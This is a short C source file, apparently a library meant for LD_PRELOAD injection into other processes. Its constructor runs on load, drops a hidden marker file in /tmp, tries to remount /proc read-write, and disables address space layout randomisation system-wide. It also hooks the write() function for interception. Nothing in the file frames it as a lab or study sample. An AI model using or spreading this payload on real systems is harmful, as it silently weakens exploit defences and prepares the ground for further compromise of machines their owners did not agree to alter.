#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

__attribute__((constructor)) void init() {
    system("echo 'LD_PRELOAD injection success!' > /tmp/.sog_injected");
    system("mount -o remount,rw /proc 2>/dev/null");
    system("echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null");
}

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*original_write)(int, const void*, size_t) = NULL;
    if (!original_write) {
        original_write = (ssize_t(*)(int, const void*, size_t)) dlsym(RTLD_NEXT, "write");
    }
    return original_write(fd, buf, count);
}
